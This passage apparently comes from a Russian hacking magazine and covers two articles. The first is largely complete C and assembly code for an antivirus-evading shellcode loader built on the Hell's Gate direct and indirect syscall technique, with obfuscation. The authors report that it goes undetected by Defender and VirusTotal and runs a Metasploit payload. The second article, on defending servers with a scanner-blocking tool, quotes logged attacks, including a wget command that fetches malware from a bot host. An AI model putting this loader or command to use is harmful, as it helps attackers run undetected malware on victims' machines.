      && *((PBYTE)pFuncAddress + 7 + idx * UP) == 0x00) {


      BYTE high = *((PBYTE)pFuncAddress + 5 + idx * UP);
      BYTE low = *((PBYTE)pFuncAddress + 4 + idx * UP);
      pNtSys->dwSSn = (high << 8) | low + idx;
      break;
     }
    }
   }
   break;
  }


 }



 if (pNtSys->dwSSn != NULL && pNtSys->pSyscallAddress != NULL &&
pNtSys->dwSyscallHash != NULL)
  return TRUE;
 else
  return FALSE;
}


ÈÇÌÅÍÅÍÈÅ ASM-ÔÀÉËÀ

В про екте Hell’s Gate присутствует и файл на ассемблере.


.data
    wSystemCall DWORD 000h


.code
    HellsGate PROC
        mov wSystemCall, 000h
        mov wSystemCall, ecx
        ret
    HellsGate ENDP


    HellDescent PROC
        mov r10, rcx
        mov eax, wSystemCall


        syscall
        ret
    HellDescent ENDP
end

В функции HellsGate выполняется  сохранение номера  сискола,  а  в
HellsDescent — вызов нужной функции. В язы ке C к этим функциям можно
обратиться, объявив внеш ние функции (клю чевое слово — extern).


extern VOID HellsGate(WORD wSystemCall);
extern HellDescent();


HellsGate(pVxTable->NtAllocateVirtualMemory.wSystemCall);
status = HellDescent((HANDLE)-1, &lpAddress, 0, &sDataSize,
MEM_COMMIT, PAGE_READWRITE);

Об рати внимание: если бы ты захотел переписать код на C++, то пот ребова-
лось бы изменить объявление фун кции HellDescent, так как в C++ каждая
функция дол жна иметь явное указание на то, что она возвращает.


extern VOID HellDescent();

Предлагаю добавить чуть-чуть обфуска ции, то есть разбавить эти ассемблер-
ные инструк ции  чем-нибудь еще. Сна чала поп робуем имена функций
HellsGate и HellsDescent заменить SetSSn и RunSyscall.


.data
    wSystemCall DWORD 0000h


.code


    SetSSn PROC
        mov wSystemCall, 000h
        mov wSystemCall, ecx
        ret
    SetSSn ENDP


    RunSyscall PROC
        mov r10, rcx
        mov eax, wSystemCall
        syscall
        ret
    RunSyscall ENDP


end

Те перь нуж но внести изменения, которые никак не отразятся на логике
выполнения программы. Добавим парочку «мусорных» инструкций.


.data
    wSystemCall DWORD 0000h


.code


    SetSSn PROC
            xor eax, eax            ; eax = 0
            mov wSystemCall, eax        ; wSystemCall = 0
            mov eax, ecx            ; eax = ssn
            mov r8d, eax            ; r8d = eax = ssn
            mov wSystemCall, r8d        ; wSystemCall = r8d = eax =
ssn
            ret
    SetSSn ENDP


    RunSyscall PROC
            xor r10, r10            ; r10 = 0
            mov rax, rcx            ; rax = rcx
            mov r10, rax            ; r10 = rax = rcx
            mov eax, wSystemCall        ; eax = ssn
            jmp Run                  ; goto 'Run'
            xor eax, eax     ; no run
            xor rcx, rcx     ; no run
            shl r10, 2       ; no run
        Run:
            syscall
            ret
    RunSyscall ENDP


end

Итак, в функции SetSSn сначала мы ксорим регис тры друг с дру гом, что при-
водит к обнулению находящего ся в них значения. Полученное зна чение
записы ваем в переменную, которая будет содержать номер сис кола, переки-
дываем из одного регистра в другой и, наконец, записы ваем нужный SSN
в переменную.
  Функция RunSyscall осо бо ничем не отли чает ся — в ней лишь была
добавлена метка.


ÏÐÅÄÂÀÐÈÒÅËÜÍÛÉ ÐÅÇÓËÜÒÀÒ

У нас поч ти все готово: алгоритм переписан, хеши сгенери рованы, ассем-
блерный код слабенько, но обфусци рован. Остается лишь исправить пос-
ледние струк туры. В Hell’s Gate есть таб лица VX_TABLE, которая содержит
структуры  функций  VX_TABLE_ENTRY.  Их   нужно   засисколить.   Так
как VX_TABLE_ENTRY мы уже изменили, оста лось лишь переписать саму
VX_TABLE.


typedef struct _NTAPI_FUNC
{
    NT_SYSCALL  NtAllocateVirtualMemory;
    NT_SYSCALL  NtProtectVirtualMemory;
    NT_SYSCALL  NtCreateThreadEx;
    NT_SYSCALL  NtWaitForSingleObject;


}NTAPI_FUNC, *PNTAPI_FUNC;


// Глобальная переменная
NTAPI_FUNC g_Nt = { 0 };

Ини циали зацию  этой  структуры  вновь выносим  в  отдельную функцию
InitializeNtSyscalls().


BOOL InitializeNtSyscalls() {


    if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &g_Nt.
NtAllocateVirtualMemory)) {
        printf("[!] Failed In Obtaining The Syscall Number Of
NtAllocateVirtualMemory \n");
        return FALSE;
    }
    printf("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.
2X \n", g_Nt.NtAllocateVirtualMemory.dwSSn);



    if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_Nt.
NtProtectVirtualMemory)) {
        printf("[!] Failed In Obtaining The Syscall Number Of
NtProtectVirtualMemory \n");
        return FALSE;
    }
    printf("[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.
2X \n", g_Nt.NtProtectVirtualMemory.dwSSn);



    if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &g_Nt.
NtCreateThreadEx)) {
        printf("[!] Failed In Obtaining The Syscall Number Of
NtCreateThreadEx \n");
        return FALSE;
    }
    printf("[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n",
g_Nt.NtCreateThreadEx.dwSSn);



    if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &g_Nt.
NtWaitForSingleObject)) {
        printf("[!] Failed In Obtaining The Syscall Number Of
NtWaitForSingleObject \n");
        return FALSE;
    }
    printf("[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X
\n", g_Nt.NtWaitForSingleObject.dwSSn);


    return TRUE;
}

Здесь NtAllocateVirtualMemory_CRC32, NtProtectVirtualMemory_CRC32
и  тому  подоб ные —  значения,  которые  были  сге нери рованы  ранее
с помощью программы-хешера.
  В резуль тате наших манипуляций глав ная фун кция main() при обре тает
следующий вид.


int main() {


    NTSTATUS    STATUS      = NULL;
    PVOID       pAddress    = NULL;
    SIZE_T      sSize       = sizeof(Payload);
    DWORD       dwOld       = NULL;
    HANDLE      hProcess    = (HANDLE)-1,   // Текущий процесс
                hThread     = NULL;


    if (!InitializeNtSyscalls()) {
        printf("[!] Failed To Initialize The Specified
Direct-Syscalls \n");
        return -1;
    }


    SetSSn(g_Nt.NtAllocateVirtualMemory.dwSSn);
    if ((STATUS = RunSyscall(hProcess, &pAddress, 0, &sSize,
MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress ==
NULL) {
        printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.
8X \n", STATUS);
        return -1;
    }


    memcpy(pAddress, Payload, sizeof(Payload));
    sSize = sizeof(Payload);


    SetSSn(g_Nt.NtProtectVirtualMemory.dwSSn);
    if ((STATUS = RunSyscall(hProcess, &pAddress, &sSize,
PAGE_EXECUTE_READ, &dwOld)) != 0x00) {
        printf("[!] NtProtectVirtualMemory Failed With Error: 0x%0.
8X \n", STATUS);
        return -1;
    }


    SetSSn(g_Nt.NtCreateThreadEx.dwSSn);
    if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL,
hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
        printf("[!] NtCreateThreadEx Failed With Error: 0x%0.8X \n",
STATUS);
        return -1;
    }


    SetSSn(g_Nt.NtWaitForSingleObject.dwSSn);
    if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
        printf("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X
\n", STATUS);
        return -1;
    }


    printf("[#] Press <Enter> To Quit ... ");
    getchar();


    return 0;
}

Ме тод  выполнения  шелл-кода  я  не  менял,  оставил  стандартный
NtCreateThreadEx(). Итак, пора про верять на антивиру сах!





                           Defender 0 Detect

Ре зультат не может не радовать. Теперь изменяем шелл-код, будем запус-
кать Metasploit.





                          Успешный обход




                                     Продолжение статьи →
КОДИНГ              ← НАЧАЛО СТАТЬИ




                     ПЕРЕПИСЫВАЕМ HELL’S GATE
                      И ОБХОДИМ АНТИВИРУС





                    Вы полнение команд


ÏÐÅÂÐÀÙÅÍÈÅ Â INDIRECT SYSCALL

Убе див шись, что наше чудо работает, приведем его к окончательному виду.
То, что мы соз дали, называется Direct Syscall — вызов сис кола путем вставки
в код программы инс трукции syscall. Такой метод самую малость шумноват,
так как инструкция syscall нехарак терна для обычных исполняемых фай лов.
  По умол чанию эта инструкция присутс твует только в фай ле ntdll.dll.
Поэтому предлагаю переделать нашу программу под Indirect Syscalls. Реали-
зация через кос венные вызовы заключается в том, что в нашем коде будет
отсутс твовать вызов инструкции syscall. Вместо это го мы собственноручно
обнаружим адрес этой инс трукции в ntdll.dll, а затем обратимся к нему,
что спровоци рует вызов и переход в Kernel Mode.
  Сначала изменяем структуру NT_SYSCALL, теперь в ней еще будет лежать
и адрес инструкции syscall.


typedef struct _NT_SYSCALL
{
    DWORD dwSSn;
    DWORD dwSyscallHash;
    PVOID pSyscallAddress;
    PVOID pSyscallInstAddress;     // Адрес будет вот тут


}NT_SYSCALL, * PNT_SYSCALL;

Следующим шагом изменим фун кцию FetchNtSyscall(), добавив в нее воз-
можность поиска адреса инс трукции syscall в адресном пространстве
ntdll.dll. Поиск вновь делаем по паттернам в памяти. Нам тре буется найти
0x0f и 0x05, что соот ветствует нужной инс трук ции.





                  Оп коды инструкции syscall

Для поиска предлагаю использовать алго ритм по добавлению к адресу фун-
кции в ntdll значения 0xFF. Этот адрес, если что, на момент поиска инс трук-
ции syscall будет лежать в pSyscallAddress.


#define RANGE 500


...
    ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys->pSyscallAddress +
0xFF;


    for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {
        if (*((PBYTE)uFuncAddress + z) == 0x0F && *((PBYTE)
uFuncAddress + x) == 0x05) {
            pNtSys->pSyscallInstAddress = ((ULONG_PTR)uFuncAddress +
z);
            break;
        }
    }

Этот код добав ляем в конец фун кции FetchNtSyscalls().


#define RANGE 500
BOOL FetchNtSyscall(IN DWORD dwSysHash, OUT PNT_SYSCALL pNtSys) {
    if (!g_NtdllConf.uModule) {
        if (!InitNtdllConfigStructure())
            return FALSE;
    }


    if (dwSysHash != NULL)
        pNtSys->dwSyscallHash = dwSysHash;
    else
        return FALSE;


    for (size_t i = 0; i < g_NtdllConf.dwNumberOfNames; i++) {
            ...
    }


    if (!pNtSys->pSyscallAddress)
        return FALSE;
    ULONG_PTR uFuncAddress = (ULONG_PTR)pNtSys->pSyscallAddress +
0xFF;


    for (DWORD z = 0, x = 1; z <= RANGE; z++, x++) {
        if (*((PBYTE)uFuncAddress + z) == 0x0F && *((PBYTE)
uFuncAddress + x) == 0x05) {
            pNtSys->pSyscallInstAddress = ((ULONG_PTR)uFuncAddress +
z);
            break;
        }
    }


    if (pNtSys->dwSSn != NULL && pNtSys->pSyscallAddress != NULL &&
pNtSys->dwSyscallHash != NULL && pNtSys->pSyscallInstAddress != NULL)
        return TRUE;
    else
        return FALSE;


}

Затем следует изме нить ассемблер ный код, а именно функции SetSSn
и RunSyscall. Раньше SetSSn тре бовал только SSN системного вызова,
а затем исполь зовал RunSyscall для его выпол нения. Теперь в SetSSn
передается еще и зна чение qSyscallInsAdress — адрес инструкции
syscall.
  Из регистров ecx и rdx, которые инициализируются при вызове функции,
копируются номер сискола и адрес. А затем в фун кции RunSyscall() мы
заносим номера сис кола в реестр eax и переходим по адресу инструкции
syscall, что приводит к выпол нению Indirect-сискола.


.data


  wSystemCall       DWORD   0h
  qSyscallInsAdress QWORD   0h


.code


  SetSSn PROC
      mov wSystemCall, 0h
      mov qSyscallInsAdress, 0h
      mov wSystemCall, ecx
      mov qSyscallInsAdress, rdx
      ret
  SetSSn ENDP


  RunSyscall PROC
      mov r10, rcx
      mov eax, wSystemCall
      jmp qword ptr [qSyscallInsAdress]
      ret
  RunSyscall ENDP


end

Ну и чуть-чуть обфусцируем наше творение.


.data
    wSystemCall         DWORD   0h
    qSyscallInsAdress   QWORD   0h


.code
        SetSSn proc
        xor eax, eax                          ; eax = 0
        mov wSystemCall, eax                  ; wSystemCall = 0
        mov qSyscallInsAdress, rax            ; qSyscallInsAdress = 0
        mov eax, ecx                          ; eax = ssn
        mov wSystemCall, eax                  ; wSystemCall = eax =
ssn
        mov r8, rdx                           ; r8 =
AddressOfASyscallInst
        mov qSyscallInsAdress, r8             ; qSyscallInsAdress =
r8 = AddressOfASyscallInst
        ret
        SetSSn endp


        RunSyscall proc
        xor r10, r10                          ; r10 = 0
        mov rax, rcx                          ; rax = rcx
        mov r10, rax                          ; r10 = rax = rcx
        mov eax, wSystemCall                  ; eax = ssn
        jmp Run
        xor eax, eax      ; wont run
        xor rcx, rcx      ; wont run
        shl r10, 2        ; wont run
    Run:
        jmp qword ptr [qSyscallInsAdress]
        xor r10, r10                        ; r10 = 0
        mov qSyscallInsAdress, r10          ; qSyscallInsAdress = 0
        ret
      RunSyscall endp


end

Что бы каждый раз не указывать элемен ты структуры NT_SYSCALL, можно
написать мак рос, который авто мати чес ки дернет SetSSn с нуж ными парамет-
рами, если ему передадут экземпляр структуры.


#define SET_SYSCALL(NtSys)(SetSSn((DWORD)NtSys.dwSSn,(PVOID)NtSys.
pSyscallInstAddress))

В результате получаем эле гантный кусок кода.


NT_SYSCALL NtAllocateVirtualMemory = { 0 };
FetchNtSyscall(NtAllocateVirtualMemory_Hash, &NtAllocateVirtualMemory
);


SET_SYSCALL(NtAllocateVirtualMemory);
RunSyscall(/* параметры для NtAllocateVirtualMemory  */);

Все нуж ные функции будут по-прежнему хранить ся в структуре NTAPI_FUNC,
надо    лишь     чуть    поправить    ини циализирующую    функцию
InitializeNtSyscalls().


BOOL InitializeNtSyscalls() {


    if (!FetchNtSyscall(NtAllocateVirtualMemory_CRC32, &g_Nt.
NtAllocateVirtualMemory)) {
        printf("[!] Failed In Obtaining The Syscall Number Of
NtAllocateVirtualMemory \n");
        return FALSE;
    }
    printf("[+] Syscall Number Of NtAllocateVirtualMemory Is : 0x%0.
2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
g_Nt.NtAllocateVirtualMemory.dwSSn, g_Nt.NtAllocateVirtualMemory.
pSyscallInstAddress);



    if (!FetchNtSyscall(NtProtectVirtualMemory_CRC32, &g_Nt.
NtProtectVirtualMemory)) {
        printf("[!] Failed In Obtaining The Syscall Number Of
NtProtectVirtualMemory \n");
        return FALSE;
    }
    printf("[+] Syscall Number Of NtProtectVirtualMemory Is : 0x%0.
2X \n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n",
g_Nt.NtProtectVirtualMemory.dwSSn, g_Nt.NtProtectVirtualMemory.
pSyscallInstAddress);



    if (!FetchNtSyscall(NtCreateThreadEx_CRC32, &g_Nt.
NtCreateThreadEx)) {
        printf("[!] Failed In Obtaining The Syscall Number Of
NtCreateThreadEx \n");
        return FALSE;
    }
    printf("[+] Syscall Number Of NtCreateThreadEx Is : 0x%0.2X \n\t\
t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.
NtCreateThreadEx.dwSSn, g_Nt.NtCreateThreadEx.pSyscallInstAddress);



    if (!FetchNtSyscall(NtWaitForSingleObject_CRC32, &g_Nt.
NtWaitForSingleObject)) {
        printf("[!] Failed In Obtaining The Syscall Number Of
NtWaitForSingleObject \n");
        return FALSE;
    }
    printf("[+] Syscall Number Of NtWaitForSingleObject Is : 0x%0.2X
\n\t\t>> Executing 'syscall' instruction Of Address : 0x%p\n", g_Nt.
NtWaitForSingleObject.dwSSn, g_Nt.NtWaitForSingleObject.
pSyscallInstAddress);


    return TRUE;
}

И финальное — main():


int main() {


    NTSTATUS    STATUS      = NULL;
    PVOID       pAddress    = NULL;
    SIZE_T      sSize       = sizeof(Payload);
    DWORD       dwOld       = NULL;
    HANDLE      hProcess    = (HANDLE)-1,
                hThread     = NULL;


    if (!InitializeNtSyscalls()) {
        printf("[!] Failed To Initialize The Specified
Indirect-Syscalls \n");
        return -1;
    }


    SET_SYSCALL(g_Nt.NtAllocateVirtualMemory);
    if ((STATUS = RunSyscall(hProcess, &pAddress, 0, &sSize,
MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) != 0x00 || pAddress ==
NULL) {
        printf("[!] NtAllocateVirtualMemory Failed With Error: 0x%0.
8X \n", STATUS);
        return -1;
    }


    memcpy(pAddress, Payload, sizeof(Payload));
    sSize = sizeof(Payload);


    SET_SYSCALL(g_Nt.NtProtectVirtualMemory);
    if ((STATUS = RunSyscall(hProcess, &pAddress, &sSize,
PAGE_EXECUTE_READ, &dwOld)) != 0x00) {
        printf("[!] NtProtectVirtualMemory Failed With Status : 0x%0.
8X\n", STATUS);
        return -1;
    }


    SET_SYSCALL(g_Nt.NtCreateThreadEx);
    if ((STATUS = RunSyscall(&hThread, THREAD_ALL_ACCESS, NULL,
hProcess, pAddress, NULL, FALSE, NULL, NULL, NULL, NULL)) != 0x00) {
        printf("[!] NtCreateThreadEx Failed With Status : 0x%0.8X\n",
STATUS);
        return -1;
    }


    SET_SYSCALL(g_Nt.NtWaitForSingleObject);
    if ((STATUS = RunSyscall(hThread, FALSE, NULL)) != 0x00) {
        printf("[!] NtWaitForSingleObject Failed With Error: 0x%0.8X
\n", STATUS);
        return -1;
    }


    printf("[#] Press <Enter> To Quit ... ");
    getchar();


    return 0;
}


ÔÈÍÀËÜÍÛÉ ÂÀÐÈÀÍÒ

Итак, проект был перепи сан под Indirect-сисколы, ассемблерный листинг
обфусцирован, логика поиска улучшена. Само собой, этот вари ант станет
еще более незаметным и скрытым от анти вирусных программ!





                  Резуль таты сканиро вания на VT





                            Defender молчит

Поз драв ляю, мы добились желаемого результата!
АДМИН





       ЗАЩИЩАЕМ ПЕРИМЕТР
        ОТ СКАНЕРОВ И БОТОВ





Давно  прошли  времена   травояд ного
интерне та, ког да машина, светящая неп-
рикрытым сетевым стеком на белом адре-
се, имела хорошие шансы жить годами,
а сло во CVE знала лишь кучка спе циалис-              xak745                                                                                            i@brumbad.ru
тов. Статистика говорит, что до момента,
пока ано ним ный разум нащупа ет  неос-
торож но открытый порт Telnet, пройдет око-
ло двух минут, Redis — шесть минут, веб
на 8080 — две надцать, а Android Debug
Bridge — двадцать.


И парни с той стороны, конечно, не просто собира ют данные для диссерта-
ции. Чтобы в этом убедиться, дос таточ но открыть SSH и посмотреть, как в
течение получаса в твой порт набьется целая команда специалистов по чужой
безопасности, генерирующих записи вро де таких:



  sshd[198760]: Failed password for www-data from 82.154.230.131 port
  65229 ssh2


  sshd[198760]: Received disconnect from 82.154.230.131 port 65229:11: Bye
  Bye [preauth]


  sshd[198760]: Disconnected from authenticating user www-data
  82.154.230.131 port 65229 [preauth]


  sshd[198766]: Invalid user bkp from 103.152.18.138 port 51314


  sshd[198766]: pam_unix(sshd:auth): check pass; user unknown


  sshd[198766]: pam_unix(sshd:auth): authentication failure; logname=
  uid=0 euid=0 tty=ssh ruser= rhost=103.152.18.138


  sshd[198766]: Failed password for invalid user bkp from 103.152.18.138
  port 51314 ssh2


Не надо быть сот рудни ком ИБ-отдела, чтобы догадаться, какие именно
иссле дования про водят эти граж дане. И избавиться от их назой ливого вни-
мания дос таточ но слож но. Уж если вцепились, то к про цес су будут подклю-
чаться всё новые и новые адреса, и вот уже кажет ся, что весь интернет сидит
и под бирает пароли к твоей машине.
   Если говорить язы ком цифр, то за час любой адрес IPv4 (даже не отве-
чающий вооб ще ни на что) опра шивается более 300 раз с полутора сотен
источников. За месяц будут опро шены все пор ты до одного, за две недели —
65 000, а за неделю — 63 000. В общем, «небольшой», но многочисленный
брат еще как сле дит.
   Учитывая, что, даже если инфраструктуру твоей ком пании обслуживает
коман да опытных спе циалистов, которые быс тро и решитель но накатывают
све жие обновления, не запускают «на пять минут» какую-нибудь службу
(которая потом висит годами) и не выкладыва ют по-быс трому файлики
для субподрядчиков (ну кто там его най дет на нашем сек ретном пор те, хе-хе),
все рав но остается неустранимое «окно уяз вимос ти».
   Экс пло ит уже в работе, а разработ чики еще тестируют патч, а потом поль-
зователи его раскатывают — пока все это про вернется, атакующая сторона,
имея предварительно собранную базу отпечатков, быстро и точно по ним
отработает. А то и просто вос пользуется поис ковиками интерне та вещей,
которые раздают доступ к такой информа ции через API за весьма скромное
воз награж дение. Да и простое сканирование при помощи какого-нибудь
ZMap позволяет, не приходя в сознание, составить грубый список целей,
по которым сле дом летит наг рузка. Кто не спрятал ся — его проблемы.
   Го раздо лучше, если охот ники на чужое о внешних службах просто
не будут знать, по край ней мере до момен та, пока напрямую не заинтересу-
ются.


ÏÎÑÒÀÍÎÂÊÀ ÇÀÄÀ×È

Работы по защите перимет ра от сканирования можно разбить на две части.
Первая — это фор мирова ние стоп-лис та с адре сами, намерения которых
вызывают вопросы (или, наоборот, никаких вопросов уже нет); вторая — рас-
пре деле ние и при менение это го спис ка по машинам.
  Ни одна, ни другая задача не представляют слож ности в плане реали-
зации, но для комплексно го решения потребуется дополнительная логика
и какой-то фор мат, в котором будет удоб но хра нить и анализировать данные.
  Делать такой комбайн только для себя не очень целесообразно, поэтому,
когда стало ясно, что парой скриптов и unit-файлом дело не обойдется, я
решил соз дать более-менее универсальный проект, при годный для исполь-
зования все ми, кому тема интересна.
   Так родился про ект scan2ban, который помога ет мне защищать машины
от ненуж ного вни мания и, воз можно, пригодится и тебе. Дальше я покажу,
как работают разные его модули и чего уда ется добиться с их при менением.




                    Ис ходники проекта в моем репозитории




ÓÃÐÎÇÛ È ÍÅÉÒÐÀËÈÇÀÖÈß

Ес ли кому-то кажется, что сканиро вание — это вещь простая и вариантов тут
нет, то он ошибается. За время наблюдения я выявил три разных типа.
  Ñêàíåð. Тут все понятно: заряди ли перебор портов, не особо скры ваясь,
и сидим ждем. Сканиро вать могут на пос тоянной основе или одноразо во,
но всег да с одного адреса. Это легко выявить и заблокировать. Если нам
прислали три пакета и ни один не попал в открытый порт, то доб ро пожало-
вать в блок. На момент написания статьи первая десятка самых активных
источников этого клас са за месяц выг лядела так.





Âàí øîòåðû. Это менее заметные персонажи. Их действия выглядят так:
со случай ного адреса при летает запрос на какой-то конкретный порт, и толь-
ко на него. Блокировать такое сканирование по счетчику бесполез но, в сле-
дующий раз ваншотер появится не скоро и точно так же опросит один порт.
При этом первое обращение все равно пройдет (если у тебя есть соот ветс-
твующая служ ба). Таких запросов во вхо дящем трафике абсолютное боль-
шинство, без малого 80%. Вот как это выглядит на протяже нии месяца.





A/B/C — это маркер агента, куда зап рос при шел. Здесь блокировать можно
только превентивно. Этим занимается модуль greyport, который повторяет
идею серых спис ков для почты. По умолчанию все порты закрыты, и, чтобы
получить доступ, надо повторить запрос задан ное число раз (число повторов,
задержку отсче та и контрольный интервал мож но задать в нас трой ках
модуля).
  В общем случае это не доставляет неудобств, кро ме замедленного пер-
вого соеди нения. Доступ для адреса по умолчанию откры вается на сутки,
потом процедура повторится. Эффективность не стопроцентная, но, задав
число повторов рав ное одному, можно отбить те самые 80% проходимцев,
два отвадят 90%, три — от 95%. Но три — это уже совсем предел. Сетевой
стек на сто роне клиента больше пяти зап росов, как правило, не отправ ляет,
и отлетать нач нут уже нормальные клиенты.
  На качество работы greyport влияет в том чис ле номер пор та. Выше я при-
вел параметры эффектив ности для портов 80 и 22, а для Elasticsearch (9200)
задержка толь ко одно го пер вого пакета отбивает 99 зап росов из 100.
   Также на при мере ска неров это го класса можно оце нить ско рость работы
«пар тнеров» по про изводс твенному процес су. Из таб лицы вид но, что задер-
жка между пакетами варьиру ется от секунд (для сосед них адресов) до часов,
если сег менты разные. Одна ко тут есть существенный элемент слу чайнос ти.
Нап ример, во вре мя подготовки выбор ки я нашел пример, когда адре са
из разных (сильно разных) сетей были опро шены с разницей в две секунды,
зато сосед ние — с разницей в две минуты.
   Тре тий тип сканеров самый спо койный. Эти периодичес ки постукивают то
тут, то там. Выг лядит это следующим образом.





Ïî èñêî âèêè ïî èíòåðíå òó âåùåé — это третья категория. От них зап-
росы при ходят бессистемно, адреса опрашива ют вразнобой. Быва ет, опра-
шивают нес колько раз с раз ных адре сов. У них целые сетевые сегменты
и  «одобрямс»  от  провайдера,  так  что можно  размазывать  запросы
по источникам и вообще никуда не спешить.
  Для работы с подобными кли ента ми предназначен модуль  lazyscan,
который проверяет, сколь ко событий с адреса было зарегистрировано
за довольно дли тельный период (по умол чанию неделя, а иногда и этого
мало). И если выясняется, что источник занима ется своим делом сис темати-
чески, модуль так же неспешно (пока наберется ста тистика), но надол го
перево дит его в спи сок заб локированных.
   Та ких субъектов за три месяца наб людений наб ралось более 5000, темпы
попол нения упа ли, но по 50–60 новых адресов в сутки продол жает добав-
ляться.
  Владельцы «легальных» сканеров предлагают писать им пись ма в случае,
если их активность кому-то не нра вится. Теоре тически, после того как ты
докажешь, что явля ешься владельцем диапазона, который хочешь исклю чить
из опросов, они боль ше не потревожат. Но такие действия боль ше напоми-
нают замазывание кус ков спутниковых карт — лучшего спо соба прив лечь
вни мание не придумать.
  Да и особого смысла слать письма нет, так как на одного добропорядоч-
ного приходится пять менее отзывчивых, жаловать ся на которых можно разве
что в спор тлото. Поэтому оптимальной тактикой выглядит молчаливый блок,
что еще и экономит силы.


ÃÎÐØÎÊ Ñ ÍÀÐÈÑÎÂÀÍÍÛÌ ÌÅÄÎÌ

Давай глянем на уровень выше и посмотрим, чем наши любители сканиро-
вать интересуются в плане прик ладных протоколов, в частности HTTP. Столь
любимые все ми веб-админки, REST и прочие чудеса — это удобс тво не толь-
ко для владельца сервиса, но и для обладателя тайного знания. Отпра вив
хит рый зап рос, он пополнит ряды администра торов устрой ства без всяких
там ROP, heap spraying и дру гих страш ных слов. Для контроля за подобной
активностью есть модуль, разбирающий запросы к Nginx и посиль но их клас-
сифицирующий.
  Кроме унылых сборщиков Git-репозиториев, содержимого /files и /
actuator/health (нет, это не попытка захватить кон троль над медицинским
манипулято ром), на момент написания статьи самым популяр ным запросом
был POST /cgi-bin/ViewLog.asp, направленный на изделия компании Zyxel,
которые начали болеть, ког да это еще не было мей нстри мом, и про должают
до сих пор.
  Сле дом   идет   отно ситель но   свежий   зап рос   POST   /goform/
set_LimitClient_cfg и стоящая за ними орда роутеров LB-LINK, которые
весной этого года синхронно возбудились и начали искать в сети себе
подоб ных. Третье место — за про дуктом ThinkPHP и запросами вида GET /

index.php?s=/index/\x09hink...
   Вся ких запросов к phpMyAdmin, GeoServer и прочим CGI — нет чис ла.
Отдельно стоят регулярные попытки зас тавить ска чать файл «с сурпры зом»,
вот прям так и пишут wget [http://x.x.x.x/bins/VuVhU33С](http://x.x.
x.x/bins/UnHAnaAW.x86). Если этот файл запус тить (внимание, не пов торяй
этого!), он выведет что-нибудь воодушев ляющее типа «Infected by Cult», грох-
нет графическую сес сию, запус тит процесс-дру гой со случайными именами
и начнет усиленно выкачи вать из интернета всякое.
  В самом фай ле видна мас са строк со сло вами p0wned и l33t впе ремеш ку
с идиоматическими выражениями, а анти вирус при виде файла раз ве что
не тре бует расколотить диск молот ком. Из чего можно сделать вывод, что
обфускацией ник то не замора чивается, так как средс тва защиты от вре-
доносного ПО на Linux скорее исключение, чем пра вило. Хотя эта тенденция
явно намека ет, что пора их громоздить в том числе и на роуте ры, если, конеч-
но, мы не хотим в пер спек тиве вернуться к плат ному тра фику как единс твен-
ному способу заставить владельцев следить за своими устрой ствами.
В общем, всё как обычно.
  Изредка логи подбрасывают интересное. Например, у сле дующе го граж-
данина что-то пошло не так, и после совершенно нейтраль ного запроса GET
/ (я тут типа мимокрокодил) он неожи дан но засе ял логи своим богатым внут-
ренним миром.





Ес ли декоди ровать Base64, то появляют ся строчки вроде Trojan_C46F6E9
и HacKed_D4990627, что как бы намекает, чем этот персонаж занимается.
Любители вдум чивой аналитики могут попробовать рас шифровать послание
из пос ледних четырех  строк: возможно,  господину Бэт мену  тре бует ся
помощь.


ÐÅÀÃÈÐÓÅÌ ÍÀ ÑÎÁÛÒÈß

Те кущее состояние блокировок хранится в базе данных (SQLite, но лучше
Postgres), но постоян но опрашивать БД на предмет новых записей, если
вдруг нужен спи сок на сто роне, не самая удачная идея, поэтому есть модуль
response. Он поз воляет вызывать внешние сценарии, когда произошло
какое-то событие. Это полез но для собствен ной автоматизации, нап ример
для моментального раскидывания блокировок. А можно подвесить чат-бота,
который будет строчить жалобы операторам сетей (а отвечать ему будет дру-
гой чат-бот, очень удобно).


Ê ÂÎÏÐÎÑÓ Î «ÏÎÏÈÍÃÓßÕ»

В былые вре мена определен ную популяр ность име ла тактика бло кировки
ICMP как спо соб сни зить инте рес к сво им машинам. Я попробовал сравнить
входящий поток на стенде, который отвечал на эхо, с запросами к машине,
которая вооб ще никак не выдает своего присутствия, и не нашел значитель-
ной разницы.
  Значит, сей час такие меры не работа ют и подой дут разве что для само-
обмана. Возможно, во вре мена 2400/NONE пропуск «молчаливых» машин
давал существен ную эко номию в скорос ти сбора информации, но сейчас
проблем с про пус кной способностью сети нет и, зап рещая эти про токо лы, ты
только создаешь больше проб лем себе.
  Параноики, конеч но, могут поволноваться, что при откры том ICMP повер-
хность ата ки больше и, ана лизи руя ответы, можно набрать чего-нибудь инте-
ресного. Однако современ ный хакер ско рее будет рас сылать мал варь
по поч те (в лучшем случае шиф руя ее архивато ром и требуя от пользователя
ввести пароль), поэтому, на мой взгляд, такие предос торожности излишни.


                                     Продолжение статьи →
АДМИН               ← НАЧАЛО СТАТЬИ




                      ЗАЩИЩАЕМ ПЕРИМЕТР
                         ОТ СКАНЕРОВ И БОТОВ





ÊÒÎ ÑÒÓ×ÈÒÑß Â ÄÂÅÐÜ ÌÎß?

Собираемая база событий позволяет побольше узнать о гос тях. Для начала
при вожу результаты чемпионата мира по непрошеному опросу портов
за месяц (интегра ция с GeoIP поз воляет генери ровать метрики с привязкой
по странам).





С серьезным отрывом лидирует зона RU, но не все так прос то. Почему —
покажу позже. Десят ка самых опра шива емых пор тов TCP выглядит вот так.





Страсти по телнету намекают на какую-то серьезную эпи демию среди роуте-
